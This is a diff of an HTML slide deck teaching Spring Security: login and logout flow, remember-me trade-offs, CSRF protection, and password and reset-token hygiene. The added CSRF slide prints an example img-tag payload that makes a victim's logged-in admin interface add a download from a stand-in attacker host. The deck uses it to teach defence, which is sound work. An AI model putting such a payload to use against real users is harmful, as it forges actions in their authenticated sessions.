@@ -128,13 +128,14 @@
                         <h1>Architecture overview</h1>
                         <h2>Standard filter composition</h2>
                         <div>
-                            <img class="plain" src="img/spring-security/filters-standard.png" alt="Spring security web integration" style="width: 45%; float: left">
-                            <ol style="width: 45%; display: inline-block; padding-top: 4em; font-size: 80%">
-                                <li>loads SecurityContext from SecurityContext repository (usually HTTP session) and store it there also</li>
-                                <li>monitors specific URL and logs a user out</li>
-                                <li>does authentication (username, LDAP, OAuth ...)</li>
-                                <li>handles AccessDeniedException and AuthenticationException navigating user to proper locations</li>
-                                <li>executes authorization upon secured URL resources</li>
+                            <img class="plain" src="img/spring-security/filters-standard.png" alt="Spring security web integration" style="width: 25%; float: left">
+                            <ol style="width: 45%; display: inline-block; padding-top: 2em; font-size: 80%">
+                                <li style="margin-bottom: 0.75em">loads SecurityContext from SecurityContext repository (usually HTTP session) and store it there also</li>
+                                <li style="margin-bottom: 0.75em">monitors specific URL and logs a user out</li>
+                                <li style="margin-bottom: 0.75em">does authentication (username, LDAP, OAuth ...)</li>
+                                <li style="margin-bottom: 0.75em">handles AccessDeniedException and AuthenticationException navigating user to proper locations</li>
+                                <li style="margin-bottom: 0.75em">examines each request against AccessDecisionManager and throws AccessDeniedException eventually</li>
+                                <li style="margin-bottom: 0.75em">stores SecurityContext</li>
                             </ol>
                         </div>
                         <div style="font-size: 80%; text-align: center; clear: both">
@@ -197,6 +198,62 @@
                         </div>
                     </section>
                     <section data-transition="fade-in fade-out">
+                        <h1>Login</h1>
+                        <div style="text-align: center; float: left; width: 47%; display: inline-block">
+                            <h3>What happens during login</h3>
+                            <p style="text-align: left; font-size: 80%">
+                                Typically <a href="http://localhost:8091/?message=org/springframework/security/web/authentication/UsernamePasswordAuthenticationFilter.java">UsernamePasswordAuthenticationFilter</a>
+                                uses <a href="http://localhost:8091/?message=org/springframework/security/authentication/ProviderManager.java">AuthenticationManager</a> that calls 
+                                <a href="http://localhost:8091/?message=org/springframework/security/authentication/AuthenticationProvider.java">AuthenticationProvider</a> (usually
+                                <a href="http://localhost:8091/?message=org/springframework/security/authentication/dao/DaoAuthenticationProvider.java">DaoAuthenticationProvider</a>)
+                                to load user details from <a href="http://localhost:8091/?message=org/springframework/security/core/userdetails/UserDetailsService.java">UserDetailsService</a> implementation.
+                            </p>
+                            <p style="text-align: left; font-size: 80%"><a href="http://localhost:8091/?message=org/springframework/security/authentication/dao/DaoAuthenticationProvider.java">DaoAuthenticationProvider</a>
+                               checks validity of the password via <a href="http://localhost:8091/?message=org/springframework/security/crypto/password/PasswordEncoder.java">PasswordEncoder</a>.</p>
+                            <p style="text-align: left; font-size: 80%">When password is ok, new <a href="http://localhost:8091/?message=org/springframework/security/core/Authentication.java">Authentication</a> object is created and stored in
+                                <a href="http://localhost:8091/?message=org/springframework/security/core/context/SecurityContext.java">SecurityContext</a>.</p>
+                            <p style="text-align: left; font-size: 80%">Session protection is applied (more on this later).</p>
+                        </div>
+                        <div style="text-align: center; width: 47%; display: inline-block">
+                            <h3>Subsequent requests</h3>
+                            <p style="text-align: left; font-size: 80%">
+                                <a href="http://localhost:8091/?message=org/springframework/security/web/context/SecurityContextPersistenceFilter.java">SecurityContextPersistenceFilter</a>
+                                fills <a href="http://localhost:8091/?message=org/springframework/security/core/context/SecurityContextHolder.java">SecurityContextHolder</a> (usually <em>ThreadLocal</em>) with
+                                <a href="http://localhost:8091/?message=org/springframework/security/core/context/SecurityContext.java">SecurityContext</a> from
+                                <a href="http://localhost:8091/?message=org/springframework/security/web/context/SecurityContextRepository.java">SecurityContextRepository</a>
+                            </p>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Logout</h1>
+                        <img class="plain" src="img/spring-security/logout.png" alt="Logout" style="width: 15%; float: left">
+                        <div>
+                            <div style="float: left; margin-left: 2em;">
+                                <h4>Recommendations</h4>
+                                <ul>
+                                    <li>always use POST</li>
+                                    <li>use CSRF token</li>
+                                </ul>
+                            </div>
+                            <div style="margin-left: 2em;">
+                                <h4>What happens on logout</h4>
+                                <ul>
+                                    <li>session is invalidated</li>
+                                    <li>remember me tokens are cleared</li>
+                                    <li>custom cookies might be cleared</li>
+                                    <li>CSRF token is invalidated</li>
+                                    <li>SecurityContext is emptied</li>
+                                    <li>user is navigated to logout page</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div style="clear: both; text-align: center; margin-top: 1em;">
+                            <a style="margin: 2em;" href="http://localhost:8091/?message=views/layout.html:85">Example</a>
+                        </div>
+                    </section>
+                </section>
+                <section data-background="img/backgrounds/brown.jpg">
+                    <section data-transition="fade-in fade-out">
                         <h1>Remember me, hot or not?</h1>
                         <div style="text-align: center">
                             <img class="plain" src="img/spring-security/remember-me.png" alt="Keep me signed in" style="width: 25%;">
@@ -220,20 +277,32 @@
                     </section>
                     <section data-transition="fade-in fade-out">
                         <h1>Remember me, hot or not?</h1>
-                        <h4>Require interactive login for</h4>
-                        <ul>
-                            <li>password change</li>
-                            <li>email change</li>
-                            <li>access to sensitive information (address)</li>
-                            <li>important actions (purchase)</li>
-                        </ul>
-                        <pre>
+                        <div style="float: left; margin-left: 2em;">
+                            <h4>Require interactive login for</h4>
+                            <ul>
+                                <li>password change</li>
+                                <li>email change</li>
+                                <li>access to sensitive information (address)</li>
+                                <li>important actions (purchase)</li>
+                            </ul>
+                        </div>
+                        <div style="margin-left: 2em;">
+                            <h4>Consider</h4>
+                            <ul>
+                                <li>HTTPS over entire site</li>
+                                <li>secure only cookie (explicitly set necessary)</li>
+                                <li>http only cookie (explicitly set necessary)</li>
+                            </ul>
+                        </div>
+                        <div style="clear: both; margin-top: 2em">
+                            <pre>
 <code class="nohighlight" data-trim data-noescape>/userProfile/*=IS_AUTHENTICATED_FULLY
 /login=IS_AUTHENTICATED_ANONYMOUSLY
 /logout=IS_AUTHENTICATED_ANONYMOUSLY
 /lostPassword=IS_AUTHENTICATED_ANONYMOUSLY
 /**=IS_AUTHENTICATED_REMEMBERED</code>
-                        </pre>
+                            </pre>
+                        </div>
                         <div>
                             <a href="http://localhost:8091/?message=org/springframework/security/access/vote/AuthenticatedVoter.java:29">Documentation</a>
                         </div>
@@ -280,6 +349,8 @@ key:               A private key to prevent modification of the remember-me toke
                                 <li>CSRF window is still open wide</li>
                                 <li>when stolen it opens up app to the attacker</li>
                                 <li>requires persistent storage</li>
+                                <li>if DB is leaked attackers can login as every user using RM cookie
+                                    (<a href="http://security.stackexchange.com/questions/63435/why-use-an-authentication-token-instead-of-the-username-password-per-request/63438#63438">see this article</a>)</li>
                             </ul>
                             <h3 style="margin-top: 1em">Advantages</h3>
                             <ul style="width: 100%">
@@ -290,44 +361,93 @@ key:               A private key to prevent modification of the remember-me toke
                             </ul>
                         </div>
                     </section>
+                </section>
+                <section data-background="img/backgrounds/brown.jpg">
                     <section data-transition="fade-in fade-out">
-                        <h1>Logout</h1>
-                        <img class="plain" src="img/spring-security/logout.png" alt="Logout" style="width: 15%; float: left">
-                        <div>
-                            <div style="float: left; margin-left: 2em;">
-                                <h4>Recommendations</h4>
-                                <ul>
-                                    <li>always use POST</li>
-                                    <li>use CSRF token</li>
-                                </ul>
-                            </div>
-                            <div style="margin-left: 2em;">
-                                <h4>What happens on logout</h4>
-                                <ul>
-                                    <li>session is invalidated</li>
-                                    <li>remember me tokens are cleared</li>
-                                    <li>custom cookies might be cleared</li>
-                                    <li>CSRF token is invalidated</li>
-                                    <li>SecurityContext is emptied</li>
-                                    <li>user is navigated to logout page</li>
-                                </ul>
-                            </div>
-                        </div>
-                        <div style="clear: both; text-align: center; margin-top: 1em;">
-                            <a style="margin: 2em;" href="http://localhost:8091/?message=views/layout.html:85">Example</a>
-                        </div>
+                        <h1>Cross-site request forgery</h1>
+                        <p>Technique that misuses an authenticated relation to execute operations via HTTP calls invisible
+                            to the user using well known URLs and parameters.</p>
+                        <ol>
+                            <li>user logs in to an administration</li>
+                            <li>user opens attacker site (in the same or different tab)</li>
+                            <li>attacker site contains IMG/SCRIPT/STYLE elements that targets administration URL
+                                with appropriate parameters to execute actions</li>
+                        </ol>
+                        <pre><code><img src="http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent"></code></pre>
+                        <p><em>HTTP GET method is easiest to hack, other methods require social engeneering or JavaScript to execute. But are not hard to do.</em></p>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>CSRF protection</h1>
+                        <ul>
+                            <li>Referer header check (not entirely recommended)</li>
+                            <li>requesting unique CSRF token in HTTP request (as parameter or header, not cookie!)</li>
+                        </ul>
+                        <p><em style="font-size: 75%">Originally Spring Security used <a href="https://spring.io/blog/2013/08/21/spring-security-3-2-0-rc1-highlights-csrf-protection/">CSRF token per session</a>
+                           but it was quite impractical (browser back button, partial update) and thus CSRF token is now unique to session.</em></p>
+                        <h3>Things to consider</h3>
+                        <ul>
+                            <li>CSRF protection needs to be part of login & logout process</li>
+                            <li>Javascript / AJAX calls might copy contents <code>X-XSRF-TOKEN</code> to HTTP header (attacker won't be able to do this due to <em>same origin policy</em>) ... see
+                                <a href="http://docs.spring.io/spring-security/site/docs/4.2.x-SNAPSHOT/reference/html/csrf.html#csrf-cookie">CookieCsrfTokenRepository</a></li>
+                            <li>Multipart form posts are harder to protect - entire body must be processed before CSRF protection might apply</li>
+                            <li>CSRF token SHOULD NOT be used in GET requests due to possible token leak via Referer header. CSRF token should be used only in HTTP POST actions that produces protected side effect.</li>
+                        </ul>
                     </section>
                 </section>
                 <section data-background="img/backgrounds/brown.jpg">
-                    <h1>Cross site request forgery (CSRF)</h1>
-
+                    <section data-transition="fade-in fade-out">
+                        <h1>Password management</h1>
+                        <img class="plain" src="img/spring-security/password.jpg" alt="Password" style="width: 30%; float: left">
+                        <div style="text-align: left; float: left; margin-left: 2em; width: 65%; font-size: 80%;">
+                            <h3>Hygienic rules to follow:</h3>
+                            <ul>
+                                <li>Use slow hashing function with unique salt per user (Spring Security default is Bcrypt)</li>
+                                <li>Don't send passwords in e-mails.</li>
+                                <li>Require strong passwords from users.</li>
+                                <li>Send passwords only over SSL.</li>
+                                <li>When user changes his password / email require entering his current password.</li>
+                                <li>Do not load users with passwords (hashes) into memory.</li>
+                            </ul>
+                            <h3 style="margin-top: 1em">Spring Security helps you with</h3>
+                            <ul>
+                                <li>hashing passwords</li>
+                                <li>enforcing SSL</li>
+                                <li>clearing pwd from logged in user object</li>
+                            </ul>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Lost password facility</h1>
+                        <h3>Hygienic rules to follow:</h3>
+                        <img class="plain" src="img/spring-security/reset.png" alt="Reset password" style="width: 30%; float: left">
+                        <div style="float: left; margin-left: 2em; width: 65%; font-size: 80%;">
+                            <ul>
+                                <li>If a user forgets their password, send them a secure one-time reset link, using a randomly generated reset token stored in the database. The token must be unique and secret, so hash the token in the database and compare it when the link is used.</li>
+                                <li>Enforce that a token can only be used to reset the password of the user who requested it.</li>
+                                <li>Store token in database only in a "hashed" version.</li>
+                                <li>Once the token is used, it must be deleted from the database and must not be allowed to be used again.</li>
+                                <li>Have all password-equivilent tokens, including reset tokens, expire after a short time, e.g. 48 hours. This prevents an attacker exploiting unused tokens at a later date.</li>
+                                <li>Immediately display a form to allow the user to set a new password. Do not use temporary random generated passwords!</li>
+                                <li>Do not use "secret questions".</li>
+                            </ul>
+                        </div>
+                    </section>
                 </section>
                 <!-- TODO HTTPs chanelling -->
                 <!-- TODO remember me fct -->
                 <!-- TODO session management, session fixation attack -->
+                <!--
+
+                <session-config>
+    <tracking-mode>COOKIE</tracking-mode>
+</session-config>
+
+                -->
                 <!-- TODO password management -->
                 <!-- TODO user switching -->
 			</div>
+
+            <!-- TO STUDY: http://stackoverflow.com/questions/549/the-definitive-guide-to-form-based-website-authentication -->
 
 		</div>
 
